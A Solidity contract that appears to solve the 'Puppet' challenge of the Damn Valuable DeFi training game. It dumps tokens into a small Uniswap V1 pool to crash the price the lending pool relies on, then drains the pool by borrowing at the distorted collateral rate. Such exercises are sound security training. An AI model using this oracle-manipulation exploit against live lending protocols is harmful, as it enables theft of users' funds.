// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./PuppetPool.sol";
import "../DamnValuableToken.sol";

interface IUniswapV1 {
    function tokenToEthSwapInput(
        uint tokenSold,
        uint minEth,
        uint deadline
    ) external returns (uint);
}

contract PuppetAttacker {

    constructor(
        address _uniswapPool,
        address _lendingPool,
        address _token,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) payable {
        address owner = msg.sender;
        PuppetPool lendingPool = PuppetPool(_lendingPool);
        DamnValuableToken token = DamnValuableToken(_token);

        address spender = address(this);
        uint256 value = 1000 ether;
        uint256 deadline = type(uint256).max;
        token.permit(owner, spender, value, deadline, v, r, s);

        // Transfer User's DVT Tokens to this contract
        token.transferFrom(msg.sender, address(this), 1000 ether);

        // Approve Uniswap contract to transfer DVT tokens
        token.approve(_uniswapPool, 1000 ether);
        // Swap the DVT tokens in return for ETH
        uint tokensReceived = IUniswapV1(_uniswapPool).tokenToEthSwapInput(
            1000 ether,
            9 ether,
            block.timestamp * 2
        );
        // Borrow the max amount from the lending pool
        lendingPool.borrow{value: address(this).balance}(100000 ether, owner);
    }

    receive() external payable {}
}
